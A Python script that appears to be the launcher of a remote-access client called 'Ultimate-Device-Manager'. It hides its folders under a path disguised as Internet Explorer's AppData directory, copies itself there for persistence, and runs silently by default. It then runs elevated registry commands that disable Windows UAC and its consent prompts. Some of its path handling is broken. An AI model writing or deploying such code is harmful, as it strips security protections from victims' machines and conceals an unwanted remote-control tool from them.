import sys, os
import tkinter
from tkinter import messagebox
import win32com.shell.shell as shell


#------PARAMETERS-FOR-ULTIDEV-CLIENT-ON-FIRST-LAUNCH------#
PutIntoStartupFolder = True  # True or False
SilentStart = True  # Informs user of launch
StartMessage = "You have launched Ultimate-Device-Manager!"  # Pops up if SilentStart is set to "False", edit this message how you want
CommandsOnStart = False
CommandsOnStartList = []  # Runs these commands on Start if "CommandsOnStart" is set to "True"
                          # Usage: type command name, use a comma "," to put more than one command
#---------------------------------------------------------#


Thisfile = sys.argv[0]  # Full file path with name and file format
Thisfile_name = os.path.basename(Thisfile)  # File name without path
user_path = os.path.expanduser('~')  # Fath to user folder
ultiDevPath = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Internet Explorer"   # Change folder name if needed
folders = ['Startup', 'Data', 'RemoteDesktop', 'bat']

os.makedirs(ultiDevPath, exist_ok=True)

for folder in folders:
    folder_path = os.path.join(ultiDevPath, folder)
    globals()[f"{folder}Path"] = folder_path  # Adds a variable for every folder by adding "Path" to folder name, e.g. "RemoteDesktopPath" or "batPath"
    os.makedirs(folder_path, exist_ok=True)

def firstLaunch():
    if PutIntoStartupFolder:
        if not os.path.exists(StartupPath+Thisfile_name):
            os.system(f'copy "{Thisfile}" "{StartupPath}"')
    if not SilentStart:
        messagebox.showinfo("Attention", StartMessage)
    if CommandsOnStart:
        pass  # For now it's on pass

    def execute_commands_as_admin(commands):
        try:
            for command in commands:
                shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c ' + command)
        except Exception as e:
            print(f"Error executing command: {e}")

    commands = [
        'reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA',
        'reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f',
        'reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f',
        'reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f',
        'reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableVirtualization /t REG_DWORD /d 0 /f'
    ]
    execute_commands_as_admin(commands)  # Turns UAC off so that you don't need to accept the launch everytime



firstLaunch()